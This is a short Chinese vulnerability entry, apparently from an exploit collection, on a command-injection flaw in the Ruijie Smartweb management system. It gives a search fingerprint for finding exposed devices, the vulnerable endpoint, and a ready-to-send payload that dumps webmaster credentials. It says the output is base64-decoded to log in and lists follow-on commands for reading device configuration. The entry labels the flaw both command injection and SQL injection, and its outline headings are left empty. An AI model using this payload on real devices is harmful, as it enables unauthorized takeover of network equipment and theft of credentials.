# 锐捷Smartweb管理系统命令注入漏洞

- **系统**：锐捷　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="Ruijie 锐捷 Smartweb"`
- **请求**：`POST /WEB_VMS/LEVEL15/ HTTP/1.1`

**请求体 / payload**
```
command=show webmaster users&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
base64解码后登录系统
可执行其它命令
show running-config       查看当前生效的配置信息
show interface fastethernet 0/3   查看F0/3端口信息
show interface serial 1/2       查看S1/2端口信息
show interface                查看所有端口信息
show ip interface brief          以简洁方式汇总查看所有端口信息
show ip interface         查看所有端口信息
show version               查看版本信息
锐捷交换机命令参考：
https://www.bilibili.com/read/cv12
```

**其他**
- 锐捷 Smartweb管理系统 命令注入漏洞: + 一、漏洞描述
+ 二、影响版本
+ 三、资产测绘
---
- 版本: + 锐捷网络股份有限公司 无线smartweb管理系统